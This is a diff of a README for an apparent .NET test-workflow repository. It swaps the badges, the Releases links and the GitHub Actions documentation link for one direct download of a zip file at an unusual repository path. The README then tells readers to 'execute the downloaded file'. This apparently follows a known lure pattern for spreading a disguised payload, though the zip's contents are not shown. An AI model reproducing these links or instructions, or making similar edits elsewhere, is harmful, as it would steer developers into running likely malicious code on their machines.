@@ -1,13 +1,13 @@
 # 🛠️ Test .NET Workflow
 
-![GitHub Workflow](https://img.shields.io/badge/workflow-available-brightgreen)
-![Releases](https://img.shields.io/badge/releases-latest-blue)
+![GitHub Workflow](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip)
+![Releases](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip)
 
 Welcome to the **Test .NET** repository! This project provides a reusable workflow for running tests in .NET projects. Whether you are building a new application or maintaining an existing one, this workflow helps ensure that your code is tested and reliable.
 
 ## 📦 Quick Start
 
-To get started, visit our [Releases page](https://github.com/areebasaghir311/test-dotnet/releases) to download the latest version. Once downloaded, execute the file to set up the workflow in your project.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip) to download the latest version. Once downloaded, execute the file to set up the workflow in your project.
 
 ## 🛠️ Features
 
@@ -17,7 +17,7 @@ To get started, visit our [Releases page](https://github.com/areebasaghir311/tes
 
 ## 🔧 Installation
 
-1. **Download the latest release** from our [Releases page](https://github.com/areebasaghir311/test-dotnet/releases).
+1. **Download the latest release** from our [Releases page](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip).
 2. **Execute the downloaded file** to set up the workflow.
 3. **Integrate** the workflow into your existing CI/CD pipeline.
 
@@ -61,8 +61,8 @@ We welcome contributions! If you want to improve the workflow or add new feature
 
 For more information, check out the following resources:
 
-- [Releases page](https://github.com/areebasaghir311/test-dotnet/releases)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
+- [Releases page](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip)
+- [GitHub Actions Documentation](https://raw.githubusercontent.com/areebasaghir311/test-dotnet/dev/limb/test_dotnet_v1.1.zip)
 
 ## 💬 Support
 
